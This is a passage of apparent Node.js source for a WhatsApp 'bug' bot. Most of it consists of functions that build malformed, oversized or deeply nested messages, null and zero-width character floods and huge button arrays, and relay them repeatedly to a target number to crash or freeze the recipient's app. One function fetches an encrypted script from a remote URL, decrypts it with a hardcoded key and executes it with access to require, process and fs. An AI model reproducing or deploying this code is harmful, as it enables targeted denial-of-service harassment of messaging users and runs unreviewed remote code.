    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

// ============================================================
// 🔥 FUNGSI BUG - FIXED VERSION
// ============================================================

async function pedrindhofcinvis(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: target tidak valid');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: gagal');
}


async function Gren(sock, target) {
    try {
        for (let i = 0; i < 1; i++) {
            const msg = {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: [
                                {
                                    messageType: 8,
                                    latexMetadata: {
                                        text: "\u0E4D".repeat(15000) + "\u0000". repeat(60000000),
                                        expressions: [
                                            {
                                                latexExpression: "Gren",
                                                fontHeight: 9999999
                                                
                                            }
                                        ]
                                    }
                                },
                                {
                                    messageType: 4,
                                    tableMetadata: {
                                        title: "\u0E4D",
                                        rows: [
                                            {
                                                items: ["\u0E4D"],
                                                isHeading: true
                                            }
                                        ]
                                    }
                                },
                                {
                                    messageType: 99,
                                    autoExecute: {
                                        trigger: "onReceive",
                                        action: "crash",
                                        payload: "\u0E4D".repeat(50000)
                                    }
                                },
                                {
                                    messageType: 7,
                                    productMetadata: {
                                        productId: "\u0E4D".repeat(50000),
                                        title: "\u0E4D".repeat(50000),
                                        description: "\u0E4D".repeat(50000),
                                        imageUrl: "https://example.com/bug.png",
                                        autoLoad: true
                                    }
                                }
                            ],
                            contextInfo: {
                                forwardingScore: 9999999,
                                isForwarded: true,
                                forwardedAiBotMessageInfo: {
                                    botJid: "867051314767696@bot"
                                },
                                forwardOrigin: 4,
                                stanzaId: "Gren_nc_" + Date.now() + "\0" + i,
                                participant: target,
                                remoteJid: target,
                                mentionedJid: [target],
                                
                                autoAction: {
                                },
                                groupMentions: {
                                    mentionAll: true
                                }
                            }
                        }
                    }
                }
            };

            await sock.relayMessage(target, msg, {});
        }
        console.log(" Gren");
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function resfcnoci(sock, target) {
const IMG = {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
fileLength: 20010,
mediaKeyTimestamp: "1785637793",
mimetype: "image/jpeg",
height: 1600,
width: 1200,
jpegThumbnail: ""
};

const TAGS = [
[0xBA, 0x03],
[0xD2, 0x04],
[0xAA, 0x02],
];

const encodeVarint = function(n) {
var buf = [];
while (n >= 0x80) {
buf.push((n & 0x7f) | 0x80);
n >>>= 7;
}
buf.push(n);
return Buffer.from(buf);
};

const wrapLd = function(tag, data) {
return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const basePayload = proto.Message.encode(
proto.Message.fromObject({ imageMessage: IMG })
).finish();

const inflate = function(tag, depth) {
var buf = basePayload;
for (var i = 0; i < depth; i++) {
buf = wrapLd(tag, wrapLd([0x0A], buf));
}
return buf;
};

const resolveJid = function(raw) {
var s = String(raw || '').trim();
if (s.includes('@')) return s;
return s.replace(/\D/g, '') + '@s.whatsapp.net';
};

const jids = (Array.isArray(target) ? target : [target])
.map(resolveJid)
.filter(function(j) { return j.length > 15; });

if (!jids.length) return;

var MAX_BATCH = 5;
var totalSent = 0;

for (var i = 0; i < 900; i++) {
for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
var chunk = jids.slice(offset, offset + MAX_BATCH);

for (var ti = 0; ti < TAGS.length; ti++) {
var tag = TAGS[ti];
var payload = null;

for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
try {
var decoded = proto.Message.decode(inflate(tag, depth));
proto.Message.encode(decoded).finish();
payload = decoded;
} catch (_) {}
}

if (!payload) continue;

var msgId = 'res' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;

try {
await sock.relayMessage('status@broadcast', payload, {
messageId: msgId,
statusJidList: chunk,
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: chunk.map(function(jid) {
return { tag: 'to', attrs: { jid: jid }, content: [] };
})
}]
}]
});
totalSent++;
console.log(`✅ DewaForce sent to ${target} (${totalSent} total)`);
} catch (_) {}

await new Promise(function(r) { setTimeout(r, 1000); });
}
}
}
}

async function GacorV1(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "KXA ANTI REDUP"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 5000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\0".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "KXA Anti Ampas"
                    },
                    nativeFlowMessage: {
                        buttons: "{".repeat(500000),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\0".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    },
                    interactiveMessage: {
                        body: {
                            text: "Creadit @Fidzkalcer1"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        nativeFlowResponseMessage: {
                            buttons: [
                                { name: "one_crash_message" },
                                { name: "booking_status", bookingId: "succes" },
                                { name: "voice_call", phone_number: "62888888888" },
                                { name: "cta_copy" }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });
    await sock.relayMessage(target, msg2, { noSelfSync: true });
}

async function CrashNoClick(sock, target) {
    const XGren = {
        msgOpaqueData: {
            body: "\u0000".repeat(50000),
            caption: "Gren Celah New proto",
            paymentNoteMsgBody: "\u600b".repeat(60000),
            matchedText: "X-SPYDER BY OXY",
            title: "@GrenTzy1",
            description: "FUNCTION CELAH DARI WA PROTO WORK KABARIN😎",
            clientUrl: "https://t.me/GrenTzy879",
            loc: "FOUR",
            pollName: "Gren",
            originalSelfAuthor: "\u800b".repeat(30000) + "@s.whatsapp.net",
            pollUpdateParentKey: "Cung",
            encReactionTargetMessageKey: "Cung wkwk",
            targetMessageKey: "\u600b".repeat(3000),
            eventName: "GrenTzy",
            eventDescription: "WORK KABARIN",
            eventJoinLink: "https://t.me/GrenTzy879",
            sharableEventInviteId: "ENTYGRE",
            sharableEventInviteTitle: "ENTYGRE",
            sharableEventInviteCaption: "XGen",
            sharableEventInviteCallLink: "https://t.me/GrenTzy879",
            quarantineExtractedText: "\u202E".repeat(3000),

            futureproofBuffer: Buffer.alloc(300000, 0x01),
            messageSecret: Buffer.alloc(200000, 0x02),
            encReactionEncPayload: Buffer.alloc(200000, 0x03),
            encReactionEncIv: Buffer.alloc(200000, 0x04),
            botMessageSecret: Buffer.alloc(200000, 0x05),
            encPayload: Buffer.alloc(300000, 0x06),
            encIv: Buffer.alloc(300000, 0x07),
            plainProtobufBytes: Buffer.alloc(400000, 0x08),
            sharableEventInviteJpegThumbnail: Buffer.alloc(200000, 0x09),
            paymentAmount1000: 2147483647,
            pollSelectableOptionsCount: 4294967295,
            correctOptionIndex: 999999999,
            lng: 9999999999.999999,
            lat: -9999999999.999999,

            senderTimestampMs: 9223372036854775807,
            eventStartTime: 9223372036854775807,
            eventEndTime: 9223372036854775807,
            pollEndTime: 9223372036854775807,
            sharableEventInviteStartTime: 9223372036854775807,
            sharableEventInviteEndTime: 9223372036854775807,
            
            pollContentType: 99,
            pollType: 99,
            isLive: true,
            isSentCagPollCreation: true,
            isEventCanceled: true,
            eventIsScheduledCall: true,
            eventExtraGuestsAllowed: true,
            pollHideVoterNames: true,
            pollAllowAddOption: true,
            sharableEventInviteIsCanceled: true,

            pollOptions: Array.from({ length: 1500 }, (_, i) => ({
                name: "\u0000".repeat(2000) + i.toString().repeat(1000) + "\u600b".repeat(2000),
                hash: "\u200B".repeat(2000) + i.toString().repeat(1000)
            })),
            
            eventLocation: {
                degreesLatitude: Infinity,
                degreesLongitude: -Infinity,
                name: "\u0000".repeat(4000) + "\u600b".repeat(4000),
                address: "\u200B".repeat(4000) + "\u202E".repeat(4000),
                url: "https://t.me/GrenTzy1" + "\0".repeat(4000),
                jpegThumbnail: Buffer.alloc(200000, 0x0A)
            },

            pollVotesSnapshot: {
                pollVotes: Array.from({ length: 500 }, () => ({
                    option: {
                        name: "\u0000".repeat(3000),
                        hash: "\u600b".repeat(3000)
                    },
                    optionVoteCount: 4294967295
                }))
            },

            encPollVote: {
                encPayload: Buffer.alloc(200000, 0x0B),
                encIv: Buffer.alloc(200000, 0x0C)
            }
        }
    };

    await sock.relayMessage(target, XGren, {
        participant: { jid: target },
        noSelfSync: true
    });
}

async function ForcecloseK7(sock, target) {
    try {
        const msg = {
            ephemeralMessage: {
                message: {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: {
                                    text: '\u0000'.repeat(80000) + '\u200B'.repeat(80000),
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: JSON.stringify({}),
                                    buttons: [
                                        {
                                            name: 'galaxy_message',
                                            buttonParamsJson: JSON.stringify({})
                                        },
                                        {
                                            name: 'call_permission_request',
                                            buttonParamsJson: JSON.stringify({})
                                        },
                                        {
                                            name: 'single_select',
                                            buttonParamsJson: JSON.stringify({})
                                        }
                                    ]
                                },
                                contextInfo: {
                                    mentionedJid: Array.from(
                                        { length: 500 },
                                        () => Math.floor(Math.random() * 100000) + '@s.whatsapp.net'
                                    )
                                }
                            }
                        }
                    }
                },
                ephemeralExpiration: 2592000
            }
        };

        for (let i = 0; i < 20; i++) {
            await sock.relayMessage(target, msg, { participant: { jid: target } }).catch(() => {});
            await new Promise(r => setTimeout(r, 100));
        }
    } catch (err) {
        console.log(`❌ ForcecloseK7 error: ${err.message}`);
    }
}

async function ForcloseClick7(sock, target) {   
    try {
        const msg1 = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [{
                            messageType: 8,
                            latexMetadata: {
                                text: "k7",
                                expressions: [{
                                    latexExpression: "k7",
                                    url: "https://t.me/pahinaTzy",
                                    fontHeight: 9999999
                                }]
                            }
                        }],
                        contextInfo: {
                            forwardingScore: 99999,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "867051314767696@bot"
                            },
                            forwardOrigin: 4
                        }
                    }
                }
            }
        };
        await sock.relayMessage(target, msg1, { participant: { jid: target } });
    } catch (err) {
        console.log(`❌ ForcloseClick7 error: ${err.message}`);
    }
}

async function ForcloseVnX(sock, target) {
  const vnx = {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
     }
       };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: vnx })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 900; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      } catch (_) {}
    }
  }
}

async function Monkey(sock, target) {
  const aray = Array.from({ length: 500000 }, () => ({}));

  for (let i = 0; i < 50; i++) {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "X-SPYDER KIL YOU",
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 5000 }, () => ({})),
              nativeFlowResponsMessage: {
                buttons: Array.from({ length: 5000 }, () => ({})),
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {});
  }
}

async function Buldozer(sock, target) {
  const nobody = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        body: {
          text: "x-spyder is bug you"
        },
        nativeFlowMessage: {
          buttons: Array.from({ length: 80000 }, () => ({
            name: "quick_reply",
            buttonParamsJson: "{\"display_text\":\"" + "\u200B".repeat(100) + "\",\"id\":\"" + "\u0000".repeat(500) + "\"}"
          })),
          messageParamsJson: "{\"a\":\"" + "\uFEFF".repeat(2000) + "\"}"
        },
        contextInfo: {
          participant: "\u200B\u200C\u200D".repeat(200),
          mentionedJid: Array.from({ length: 100 }, () => "\u200B".repeat(30) + "@s.whatsapp.net"),
          forwardingScore: 1,
          isForwarded: true
        }
      }
    }
  },
  messageContextInfo: {
    paddingBytes: "\u0000".repeat(50000),
    messageSecret: "\u200B".repeat(8000),
    botMessageSecret: "\u200C".repeat(8000),
    teeBotMetadata: "\u200D".repeat(12000),
    limitSharing: {},
    limitSharingV2: {},
    botMetadata: {
      personaId: "\u200B\u200C\u200D".repeat(300),
      invokerJid: "\u200B\u200C\u200D".repeat(400),
      timezone: "\u200B".repeat(100),
      messageDisclaimerText: "\u200B".repeat(800),
      conversationStarterPromptId: "\u200B".repeat(300),
      botResponseId: "\u200B".repeat(300),
      aiConversationContext: "\u0000".repeat(35000),
      internalMetadata: "\uFFFF".repeat(25000),
      pttPromptMetadata: {
        transcript: "\u200B".repeat(5000)
      },
      commandMetadata: {
        commandName: "\u200C".repeat(1000),
        commandDescription: "\u200D".repeat(1500),
        commandPrompt: "\u2060".repeat(2000)
      },
      renderingMetadata: {
        keywords: Array.from({ length: 300 }, (_, i) => ({
          value: "\u2061\u2062\u2063".repeat(150) + i,
          associatedPrompts: Array.from({ length: 60 }, () => "\u2064".repeat(100))
        }))
      },
      memoryMetadata: {
        addedFacts: Array.from({ length: 500 }, (_, i) => ({
          fact: "\u0000\u200B".repeat(200) + i,
          factId: "\u200C".repeat(100) + i
        })),
        removedFacts: Array.from({ length: 500 }, (_, i) => ({
          fact: "\u200D\uFEFF".repeat(150) + i,
          factId: "\u2060".repeat(80) + i
        })),
        disclaimer: "\u115F".repeat(1000)
      },
      botHistoryShareMetadata: {
        participantsMetadata: Array.from({ length: 800 }, (_, i) => ({
          botFbid: "\u200B".repeat(400) + i
        }))
      },
      verificationMetadata: {
        proofs: Array.from({ length: 150 }, () => ({
          version: 999,
          useCase: 999,
          signature: "\u0000".repeat(1500),
          certificateChain: Array.from({ length: 50 }, () => "\uFFFF".repeat(800)),
          certificateChainSki: Array.from({ length: 50 }, () => ({
            useCase: 999,
            ski: "\u0000".repeat(800)
          }))
        }))
      },
      capabilityMetadata: {
        capabilities: Array.from({ length: 1000 }, () => 999)
      },
      botGroupMetadata: {
        participantsMetadata: Array.from({ length: 500 }, (_, i) => ({
          botFbid: "\u200C".repeat(300) + i
        }))
      },
      botThreadInfo: {
        serverInfo: {
          title: "\u200B".repeat(300)
        },
        clientInfo: {
          type: 999
        }
      }
    }
  }
};
await sock.relayMessage(target, nobody, {});
}

async function monkey(sock, target) {
    try {
        const repeat = 2000000;
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0FD7"
                        },
                        nativeFlowMessage: {
                            buttons: "one_crash_message".repeat(20000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {
            participant: { jid: target },
            noSyncself: true
        });
    } catch (err) {
        console.error("Error:", err);
    }
}

async function maklugueinjak(sock, target) {
    try {
        if (!sock || !target) {
            console.log('❌ Parameter kosong!');
            return;
        }
        console.log(`🔥 maklugueinjak invis ke ${target}`);
        const blankPayload = "\u0000".repeat(100000);
        const fontCrash = "ꦽ".repeat(50000);
        const maklo = JSON.stringify({ status: true });
        
        const message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "༑⌁⃰./⟅༑ ြိိိိိိိိိိိိိိိိိိိိိိိိိိိိိိိုာ့်််််််််််််််််််််််််််််််််််််း ❁۪ ཀ‌‌" + blankPayload
                        },
                        footer: {
                            text: fontCrash
                        },
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: maklo
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: maklo
                                }
                            ],
                            messageParamsJson: JSON.stringify({})
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, message, {
            participant: { jid: target },
            noSelfSync: true
        });

        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error maklugueinjak: " + err.message);
    }
}

async function D3nss(sock, target) {
    try {
        const StanzaSock = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: "0@s.whatsapp.net"
                        },
                        body: {
                            text: " " + "CRASH".repeat(100000),
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CRASH".repeat(10000),
                                        id: "crash_btn_1"
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CRASH".repeat(10000),
                                        url: "https://example.com"
                                    })
                                },
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CRASH".repeat(10000),
                                        copy_code: "CRASH".repeat(10000)
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        icon: "PROMOTION",
                                        flow_cta: "PAYMENT_PROMOTION",
                                        flow_message_version: "3"
                                    })
                                }
                            ],
                            messageParamsJson: JSON.stringify({})
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, StanzaSock, {
            messageId: sock.generateMessageTag(),
            participant: { jid: target }
        });
    } catch (err) {
        console.log(`❌ D3nss error: ${err.message}`);
    }
}

async function Rena4YouBlankHard(sock, target) {
    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "x-spyder Attack"
                    },
                    nativeFlowMessage: {
                        name: "galaxy_status_mesaage",
                        extra: "\u31040",
                        buttons: "A".repeat(20000),
                        butrons: "A".repeat(50000),
                        extra1: "\u0000".repeat(555),
                        extra2: "\u0000".repeat(333),
                        flow_action: "navigate",
                        flow_cta: "Rena"
                    }
                }
            }
        },
        callogMesaage: {
            Callid: "\u0000".repeat(6666),
            extraCall1: "\u0000".repeat(20000),
            extraCall2: "\u0000".repeat(5555),
            flow_cta: "RenaIsHere"
        }
    };
    await sock.relayMessage(target, msg);
    
    const payload = {
      interactiveMessage: {
        body: { text: "x-spyder" },
        nativeFlowMessage: {
          messageParamsJson: "[".repeat(10000),
          buttons: Array(10000).fill({           
            name: "cta_copy",
            buttonParamsJson: "{}"
          })
        }
      }
    };
    await sock.relayMessage(target, payload, {});
}

async function TheAnomoyusHardNew(sock, target) {
    const msg1 = generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "X-SPYDER??",
                description: "\u0000".repeat(50000),
                jpegThumbnail: null,
                contextInfo: {
                    quotedMessage: {
                        imageMessage: {
                            caption: "X-SPYDER??",
                            mimetype: "image/jpeg",
                            jpegThumbnail: null,
                            ImageSourceType: 1
                        }
                    },
                    remoteJid: "status@broadcast"
                },
                fontType: 2,
                previewType: 5,
                paymentLinkMetadata: {
                    provider: {
                        paramsJson: "[{".repeat(300000)
                    },
                    header: {
                        headerType: 1
                    },
                    button: {
                        displayText: "X-SPYDER HERE"
                    }
                }
            }
        },
        {}
    );

    const msg2 = {
        interactiveMessage: {
            body: {},
            nativeFlowMessage: {
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

    const msg3 = {
        interactiveMessage: {
            body: { text: "X-SPYDER" },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    tap_target_configuration: {
                        title: "\0",
                        description: "RenaOffc",
                        canonical_url: "\0".repeat(3000),
                        domain: null,
                        button_index: 0
                    }
                }),
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

   const code = "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u500B";
    const repeat = 1000000;

    const msg4 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X-SPYDERꦾ",
                        display_text: "\u200C"
                    },
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            icon: "document",
                            title: "x-spyder",
                            sections: Array.from({ length: 505555 }, () => ({}))
                        })
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});

    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
